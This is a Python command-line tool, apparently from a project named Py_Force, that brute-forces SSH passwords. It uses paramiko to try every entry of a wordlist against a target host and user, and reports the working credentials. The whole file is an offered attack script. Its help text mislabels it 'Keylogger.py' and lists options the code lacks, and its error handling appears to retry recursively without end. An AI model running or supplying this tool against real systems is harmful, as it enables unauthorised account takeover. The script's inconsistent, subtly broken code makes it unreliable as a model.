import paramiko
import sys
import getopt
from colorama import init, Fore
import socket
import time

global info, target, user, passwords, port
# initialize colorama
init()
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
RESET = Fore.RESET
BLUE = Fore.BLUE
# Options
options = "hu:p:t:w:"
# Long options
long_options = ["help", "user =", "port =", "target =", "word_list ="]


def connexion(password, user, port, target):
    ssh = paramiko.SSHClient()
    try:
        ssh.connect(hostname=target, username=user, password=password, port=port)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {target} on port {port} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{YELLOW}[!] Invalid credentials for {user}:{password}{RESET}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return connexion(password, user, port, target)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {target}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}")
        return True


def main(argumentlist):
    global info, target, user, passwords, port
    info = False

    try:

        arguments, values = getopt.getopt(argumentlist, options, long_options)
        for currentArgument, currentValue in arguments:
            if currentArgument in ("-h", "--help"):  # test if there is -h or --help
                print(infos())  # print help
            elif currentArgument in ("-u", "--user "):  # test if there is -o --output
                user = currentValue
            elif currentArgument in ("-w", "--word_list "):
                passwords = open(currentValue).read().splitlines()
            elif currentArgument in ("-t", "--target "):
                target = currentValue
            elif currentArgument in ("-p", "--port"):
                port = int(currentValue)
        if not info and len(arguments) != 0:  # if the help was not printed then
            for password in passwords:
                connexion(password, user, port, target)
        else:
            print(infos())
    except getopt.error as err:  # if there is an error
        # output error, and return with an error code
        print(str(err))  # print it
        print(infos())  # and print the help
        sys.exit()


def infos():
    global info
    info = True
    return ("Keylogger.py\n"
            "OPTION\n"
            "-h   --help      <Show this page>\n"
            "-u   --user_list    <output-directory>\n"
            "-p   --port\n"
            "-w   --word_list\n"
            "-t   --target\n"
            "\n"
            "EXAMPLES:\n"
            "main.py -u user.txt -w pass.txt -p 22 -t 127.0.0.1 \n"
            "main.py -h\n"
            "\n"
            "SEE THE MAN PAGE https://github.com/M0ShYy/Py_Force FOR MORE OPTIONS AND EXAMPLES\n")


"""argumentList = (sys.argv[1:])                               # make a list of all the option wrote by the user
main(argumentList)"""

if __name__ == '__main__':
    argument = "-u lucas -w pass.txt -p 22 -t 127.0.0.1"
    argumentList = (argument.split())
    print(argumentList)
    main(argumentList)
